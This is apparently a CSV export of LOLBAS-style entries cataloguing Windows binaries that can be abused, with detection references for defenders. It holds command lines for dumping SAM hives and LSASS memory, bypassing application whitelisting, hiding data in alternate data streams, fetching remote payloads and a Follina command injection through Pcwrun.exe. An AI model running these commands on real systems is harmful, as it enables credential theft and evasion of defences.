"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_MitreID","Commands_OperatingSystem","Commands_Tags","Commands_Tags_Download","Full_Path","Full_Path_Path","Detection","Detection_IOC","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Commands_Tags_Execute","Resources","Resources_Link","Code_Sample","Code_Sample_Code","Detection_Sigma","Detection_Analysis","Detection_BlockRule","Commands_Tags_Requires","Commands_Tags_Input","Detection_Splunk","Detection_Elastic","Aliases","Aliases_Alias","Commands_Tags_Application","Commands_Tags_Type","is_legit"
"Regsvcs.exe","Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies","Oddvar Moe","2018-05-25","","[''regsvcs.exe {PATH:.dll}''-|-''regsvcs.exe {PATH:.dll}'']","[''Loads the target .NET DLL file and executes the RegisterClass function.''-|-''Loads the target .NET DLL file and executes the RegisterClass function.'']","[''Execute dll file and bypass Application whitelisting''-|-''Execute dll file and bypass Application whitelisting'']","[''Execute''-|-''AWL Bypass'']","[''User''-|-''Local Admin'']","[''T1218.009''-|-''T1218.009'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\Microsoft.NET\Framework64\v2.0.50727\RegSvcs.exe''-|-''C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe''-|-''C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegSvcs.exe''-|-''C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe'']","","","","Casey Smith","@subtee","[''DLL (.NET)''-|-''DLL (.NET)'']","","[''https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/''-|-''https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.md'']","","","https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_regasm.yml","","","","","https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_regsvcs_with_network_connection.yml","https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml","","","","","false"
"Register-cimprovider.exe","Used to register new wmi providers","Oddvar Moe","2018-05-25","","Register-cimprovider -path {PATH_ABSOLUTE:.dll}","Load the target .DLL.","Execute code within dll file","Execute","User","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","","","","[''C:\Windows\System32\Register-cimprovider.exe''-|-''C:\Windows\SysWOW64\Register-cimprovider.exe'']","","Register-cimprovider.exe execution and cmdline DLL load may be supsicious","","Philip Tsukerman","@PhilipTsukerman","DLL","","https://twitter.com/PhilipTsukerman/status/992021361106268161","","","https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_susp_register_cimprovider.yml","","","","","","","","","","","false"
"Regini.exe","Used to manipulate the registry","Oddvar Moe","2020-07-03","","regini.exe {PATH}:hidden.ini","Write registry keys from data inside the Alternate data stream.","Write to registry","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","","","","[''C:\Windows\System32\regini.exe''-|-''C:\Windows\SysWOW64\regini.exe'']","","regini.exe reading from ADS","","Eli Salem","@elisalem9","","","https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","","","[''https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regini_ads.yml''-|-''https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regini_execution.yml'']","","","","","","","","","","","false"
"Regedit.exe","Used by Windows to manipulate registry","Oddvar Moe","2018-05-25","","[''regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey''-|-''regedit {PATH_ABSOLUTE}:regfile.reg'']","[''Export the target Registry key to the specified .REG file.''-|-''Import the target .REG file into the Registry.'']","[''Hide registry data in alternate data stream''-|-''Import hidden registry data from alternate data stream'']","[''ADS''-|-''ADS'']","[''User''-|-''User'']","[''T1564.004''-|-''T1564.004'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","C:\Windows\regedit.exe","","[''regedit.exe reading and writing to alternate data stream''-|-''regedit.exe should normally not be executed by end-users'']","","Oddvar Moe","@oddvarmoe","","","https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f","","","https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml","","","","","","","","","","","false"
"Regasm.exe","Part of .NET","Oddvar Moe","2018-05-25","","[''regasm.exe {PATH:.dll}''-|-''regasm.exe /U {PATH:.dll}'']","[''Loads the target .NET DLL file and executes the RegisterClass function.''-|-''Loads the target .DLL file and executes the UnRegisterClass function.'']","[''Execute code and bypass Application whitelisting''-|-''Execute code and bypass Application whitelisting'']","[''AWL Bypass''-|-''Execute'']","[''Local Admin''-|-''User'']","[''T1218.009''-|-''T1218.009'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe''-|-''C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe''-|-''C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe''-|-''C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe'']","","regasm.exe executing dll file","","Casey Smith","@subtee","[''DLL (.NET)''-|-''DLL (.NET)'']","","[''https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/''-|-''https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.md'']","","","https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_regasm.yml","","","","","[''https://github.com/splunk/security_content/blob/bc93e670f5dcb24e96fbe3664d6bcad92df5acad/docs/_stories/suspicious_regsvcs_regasm_activity.md''-|-''https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_regasm_with_network_connection.yml'']","https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml","","","","","false"
"Reg.exe","Used to manipulate the registry","Oddvar Moe","2018-05-25","","[''reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg''-|-''reg save HKLM\SECURITY {PATH_ABSOLUTE:.1.bak} && reg save HKLM\SYSTEM {PATH_ABSOLUTE:.2.bak} && reg save HKLM\SAM {PATH_ABSOLUTE:.3.bak}'']","[''Export the target Registry key and save it to the specified .REG file within an Alternate data stream.''-|-''Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material'']","[''Hide/plant registry information in Alternate data stream for later use''-|-''Dump credentials from the Security Account Manager (SAM)'']","[''ADS''-|-''Credentials'']","[''User''-|-''Administrator'']","[''T1564.004''-|-''T1003.002'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\System32\reg.exe''-|-''C:\Windows\SysWOW64\reg.exe'']","","reg.exe writing to an ADS","","Oddvar Moe","@oddvarmoe","","","[''https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f''-|-''https://pure.security/dumping-windows-credentials/'']","","","[''https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml''-|-''https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regedit_import_keys.yml''-|-''https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives.yml'']","","","","","https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/attempted_credential_dump_from_registry_via_reg_exe.yml","https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_dump_registry_hives.toml","","","","","false"
"rdrleakdiag.exe","Microsoft Windows resource leak diagnostic tool","John Dwyer","2022-05-18","","[''rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1''-|-''rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1''-|-''rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap'']","[''Dump process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).''-|-''Dump LSASS process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).''-|-''After dumping a process using /wait 1, subsequent dumps must use /snap (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).'']","[''Dump process by PID.''-|-''Dump LSASS process.''-|-''Dump LSASS process mutliple times.'']","[''Dump''-|-''Dump''-|-''Dump'']","[''User''-|-''Administrator''-|-''Administrator'']","[''T1003''-|-''T1003.001''-|-''T1003.001'']","[''Windows''-|-''Windows''-|-''Windows'']","","","","[''c:\windows\system32\rdrleakdiag.exe''-|-''c:\Windows\SysWOW64\rdrleakdiag.exe'']","","","","Grzegorz Tworek","@0gtweet","","","[''https://twitter.com/0gtweet/status/1299071304805560321?s=21''-|-''https://www.pureid.io/dumping-abusing-windows-credentials-part-1/''-|-''https://github.com/LOLBAS-Project/LOLBAS/issues/84'']","","","https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_rdrleakdiag_process_dumping.yml","","","","","","[''https://www.elastic.co/guide/en/security/current/potential-credential-access-via-windows-utilities.html''-|-''https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml'']","","","","","false"
"Rasautou.exe","Windows Remote Access Dialer","Tony Lambert","2020-01-10","","rasautou -d {PATH:.dll} -p export_name -a a -e e","Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10.","Execute DLL code","Execute","User, Administrator in Windows 8","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1","","","","C:\Windows\System32\rasautou.exe","","rasautou.exe command line containing -d and -p","","FireEye","@FireEye","DLL","","[''https://github.com/fireeye/DueDLLigence''-|-''https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html'']","","","https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_rasautou_dll_execution.yml","","","","","","","","","","","false"
"Psr.exe","Windows Problem Steps Recorder, used to record screen and clicks.","Leon Rodenko","2020-06-27","","psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0","Record a user screen without creating a GUI. You should use ""psr.exe /stop"" to stop recording and create output file.","Can be used to take screenshots of the user environment","Reconnaissance","User","T1113","since Windows 7 (client) / Windows 2008 R2","","","","[''c:\windows\system32\psr.exe''-|-''c:\windows\syswow64\psr.exe'']","","[''psr.exe spawned''-|-''suspicious activity when running with ""/gui 0"" flag'']","","Leon Rodenko","@L3m0nada","","","https://social.technet.microsoft.com/wiki/contents/articles/51722.windows-problem-steps-recorder-psr-quick-and-easy-documenting-of-your-steps-and-procedures.aspx","","","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_psr_capture_screenshots.yml","","","","","","","","","","","false"
"Provlaunch.exe","Launcher process","Grzegorz Tworek","2023-06-30","","provlaunch.exe LOLBin","Executes command defined in the Registry. Requires 3 levels of the key structure containing some keywords. Such keys may be created with two reg.exe commands, e.g. `reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0` and `reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe`. Registry keys are deleted after successful execution.","Executes arbitrary command","Execute","Administrator","T1218","Windows 10, Windows 11, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022","","","","c:\windows\system32\provlaunch.exe","","[''c:\windows\system32\provlaunch.exe executions''-|-''Creation/existence of HKLM\SOFTWARE\Microsoft\Provisioning\Commands subkeys'']","","Grzegorz Tworek","@0gtweet","CMD","","https://twitter.com/0gtweet/status/1674399582162153472","","","[''https://github.com/SigmaHQ/sigma/blob/9cb124f841c4358ca859e8474d6e7bb5268284a2/rules/windows/process_creation/proc_creation_win_provlaunch_potential_abuse.yml''-|-''https://github.com/SigmaHQ/sigma/blob/9cb124f841c4358ca859e8474d6e7bb5268284a2/rules/windows/process_creation/proc_creation_win_provlaunch_susp_child_process.yml''-|-''https://github.com/SigmaHQ/sigma/blob/9cb124f841c4358ca859e8474d6e7bb5268284a2/rules/windows/process_creation/proc_creation_win_registry_provlaunch_provisioning_command.yml''-|-''https://github.com/SigmaHQ/sigma/blob/9cb124f841c4358ca859e8474d6e7bb5268284a2/rules/windows/registry/registry_set/registry_set_provisioning_command_abuse.yml'']","","","","","","","","","","","false"
"PrintBrm.exe","Printer Migration Command-Line Tool","Elliot Killick","2021-06-21","","[''PrintBrm -b -d {PATH_SMB:folder} -f {PATH_ABSOLUTE:.zip}''-|-''PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}'']","[''Create a ZIP file from a folder in a remote drive''-|-''Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder'']","[''Exfiltrate the contents of a remote folder on a UNC share into a zip file''-|-''Decompress and extract a ZIP file stored on an alternate data stream to a new folder'']","[''Download''-|-''ADS'']","[''User''-|-''User'']","[''T1105''-|-''T1564.004'']","[''Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","C:\Windows\System32\spool\tools\PrintBrm.exe","","PrintBrm.exe should not be run on a normal workstation","","Elliot Killick","@elliotkillick","","","https://twitter.com/elliotkillick/status/1404117015447670800","","","https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_printbrm.yml","","","","","","","","","","[''Compression''-|-''Compression'']","false"
"Print.exe","Used by Windows to send files to the printer","Oddvar Moe","2018-05-25","","[''print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}''-|-''print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}''-|-''print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}'']","[''Copy file.exe into the Alternate Data Stream (ADS) of file.txt.''-|-''Copy file from source to destination''-|-''Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.'']","[''Hide binary file in alternate data stream to potentially bypass defensive counter measures''-|-''Copy files''-|-''Copy/Download file from remote server'']","[''ADS''-|-''Copy''-|-''Copy'']","[''User''-|-''User''-|-''User'']","[''T1564.004''-|-''T1105''-|-''T1105'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\System32\print.exe''-|-''C:\Windows\SysWOW64\print.exe'']","","[''Print.exe retrieving files from internet''-|-''Print.exe creating executable files on disk'']","","Oddvar Moe","@oddvarmoe","","","[''https://twitter.com/Oddvarmoe/status/985518877076541440''-|-''https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410'']","","","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_print_remote_file_copy.yml","","","","","","","","","","","false"
"Presentationhost.exe","File is used for executing Browser applications","Oddvar Moe","2018-05-25","","[''Presentationhost.exe {PATH_ABSOLUTE:.xbap}''-|-''Presentationhost.exe {REMOTEURL}'']","[''Executes the target XAML Browser Application (XBAP) file''-|-''It will download a remote payload and place it in INetCache.'']","[''Execute code within XBAP files''-|-''Downloads payload from remote server'']","[''Execute''-|-''Download'']","[''User''-|-''User'']","[''T1218''-|-''T1105'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","INetCache","","[''C:\Windows\System32\Presentationhost.exe''-|-''C:\Windows\SysWOW64\Presentationhost.exe'']","","Execution of .xbap files may not be common on production workstations","","[''Casey Smith''-|-''Nir Chako (Pentera)'']","[''@subtee''-|-''@C_h4ck_0'']","XBAP","","[''https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf''-|-''https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/'']","","","[''https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml''-|-''https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml'']","","","","","","","","","","","false"
"Pnputil.exe","Used for installing drivers","Hai vaknin (lux)","2020-12-25","","pnputil.exe -i -a {PATH_ABSOLUTE:.inf}","Used for installing drivers","Add malicious driver","Execute","Administrator","T1547","Windows 7, Windows 10, Windows 11","","","","C:\Windows\system32\pnputil.exe","","","","[''Hai Vaknin(Lux)''-|-''Avihay eldad'']","[''@LuxNoBulIshit''-|-''@aloneliassaf'']","INF","","","","https://github.com/LuxNoBulIshit/test.inf/blob/main/inf","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_susp_driver_installed_by_pnputil.yml","","","","","","","","","","","false"
"Pktmon.exe","Capture Network Packets on the windows 10 with October 2018 Update or later.","Derek Johnson","2020-08-12","","[''pktmon.exe start --etw''-|-''pktmon.exe filter add -p 445'']","[''Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop''-|-''Select Desired ports for packet capture'']","[''use this a built in network sniffer on windows 10 to capture senstive traffic''-|-''Look for interesting traffic such as telent or FTP'']","[''Reconnaissance''-|-''Reconnaissance'']","[''Administrator''-|-''Administrator'']","[''T1040''-|-''T1040'']","[''Windows 10 1809 and later, Windows 11''-|-''Windows 10 1809 and later, Windows 11'']","","","","[''c:\windows\system32\pktmon.exe''-|-''c:\windows\syswow64\pktmon.exe'']","",".etl files found on system","","Derek Johnson","","","","https://binar-x79.com/windows-10-secret-sniffer/","","","https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_pktmon.yml","","","","","","","","","","","false"
"Pcwrun.exe","Program Compatibility Wizard","Oddvar Moe","2018-05-25","","[''Pcwrun.exe {PATH_ABSOLUTE:.exe}''-|-''Pcwrun.exe /../../$(calc).exe'']","[''Open the target .EXE file with the Program Compatibility Wizard.''-|-''Leverage the MSDT follina vulnerability through Pcwrun to execute arbitrary commands and binaries. Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.'']","[''Proxy execution of binary''-|-''Proxy execution of binary'']","[''Execute''-|-''Execute'']","[''User''-|-''User'']","[''T1218''-|-''T1202'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","C:\Windows\System32\pcwrun.exe","","","","[''Pierre-Alexandre Braeken''-|-''Nasreddine Bencherchali'']","[''@pabraeken''-|-''@nas_bench'']","[''EXE''-|-''EXE'']","","[''https://twitter.com/pabraeken/status/991335019833708544''-|-''https://twitter.com/nas_bench/status/1535663791362519040'']","","","https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_pcwrun_follina.yml","","","","","","","","","","","false"
"Pcalua.exe","Program Compatibility Assistant","Oddvar Moe","2018-05-25","","[''pcalua.exe -a {PATH:.exe}''-|-''pcalua.exe -a {PATH_SMB:.dll}''-|-''pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java'']","[''Open the target .EXE using the Program Compatibility Assistant.''-|-''Open the target .DLL file with the Program Compatibilty Assistant.''-|-''Open the target .CPL file with the Program Compatibility Assistant.'']","[''Proxy execution of binary''-|-''Proxy execution of remote dll file''-|-''Execution of CPL files'']","[''Execute''-|-''Execute''-|-''Execute'']","[''User''-|-''User''-|-''User'']","[''T1202''-|-''T1202''-|-''T1202'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","C:\Windows\System32\pcalua.exe","","","","[''Kyle Hanslovan''-|-''Fab'']","[''@kylehanslovan''-|-''@0rbz_'']","[''EXE''-|-''DLL''-|-''Remote''-|-''DLL'']","","https://twitter.com/KyleHanslovan/status/912659279806640128","","","https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_pcalua.yml","","","","","","","","","","","false"
"OneDriveStandaloneUpdater.exe","OneDrive Standalone Updater","Elliot Killick","2021-08-22","","OneDriveStandaloneUpdater","Download a file from the web address specified in HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC. ODSUUpdateXMLUrlFromOC and UpdateXMLUrlFromOC must be equal to non-empty string values in that same registry key. UpdateOfficeConfigTimestamp is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in %localappdata%\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json","Download a file from the Internet without executing any anomalous executables with suspicious arguments","Download","User","T1105","Windows 10","","","","[''C:\Users\<username>\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe''-|-''C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe''-|-''C:\Program Files (x86)\Microsoft OneDrive\OneDriveStandaloneUpdater.exe'']","","[''HKCU\Software\Microsoft\OneDrive\UpdateOfficeConfig\UpdateRingSettingURLFromOC being set to a suspicious non-Microsoft controlled URL''-|-''Reports of downloading from suspicious URLs in %localappdata%\OneDrive\setup\logs\StandaloneUpdate_*.log files'']","","Elliot Killick","@elliotkillick","","","https://github.com/LOLBAS-Project/LOLBAS/pull/153","","","https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/registry/registry_set/registry_set_lolbin_onedrivestandaloneupdater.yml","","","","","","","","","","","false"
"OfflineScannerShell.exe","Windows Defender Offline Shell","Elliot Killick","2021-08-16","","OfflineScannerShell","Execute mpclient.dll library in the current working directory","Can be used to evade defensive countermeasures or to hide as a persistence mechanism","Execute","Administrator","T1218","Windows 10, Windows 11","","","","C:\Program Files\Windows Defender\Offline\OfflineScannerShell.exe","","OfflineScannerShell.exe should not be run on a normal workstation","","Elliot Killick","@elliotkillick","DLL","","","","","https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/process_creation/proc_creation_win_lolbas_offlinescannershell.yml","","","","","","","","","","","false"
"Odbcconf.exe","Used in Windows for managing ODBC connections","Oddvar Moe","2018-05-25","","[''odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}''-|-''odbcconf INSTALLDRIVER ""lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2"" odbcconf configsysdsn ""lolbas-project"" ""DSN=lolbas-project"" ''-|-''odbcconf -f {PATH:.rsp}'']","[''Execute DllRegisterServer from DLL specified.''-|-''Install a driver and load the DLL. Requires administrator privileges.''-|-''Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file.'']","[''Execute a DLL file using technique that can evade defensive counter measures''-|-''Execute dll file using technique that can evade defensive counter measures''-|-''Execute dll file using technique that can evade defensive counter measures'']","[''Execute''-|-''Execute''-|-''Execute'']","[''User''-|-''User''-|-''Administrator'']","[''T1218.008''-|-''T1218.008''-|-''T1218.008'']","[''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11''-|-''Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11'']","","","","[''C:\Windows\System32\odbcconf.exe''-|-''C:\Windows\SysWOW64\odbcconf.exe'']","","","","[''Casey Smith''-|-''Adam'']","[''@subtee''-|-''@Hexacorn'']","[''DLL''-|-''DLL'']","","[''https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b''-|-''https://github.com/woanware/application-restriction-bypasses''-|-''https://www.hexacorn.com/blog/2020/08/23/odbcconf-lolbin-trifecta/'']","","https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/58b5eb751379501aa237275f14381f0902e979a5/Archive-Old-Version/OSBinaries/Payload/file.rsp","[''https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_odbcconf_response_file.yml''-|-''https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_odbcconf_response_file_susp.yml'']","","","","","","[''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml''-|-''https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml'']","","","","","false"
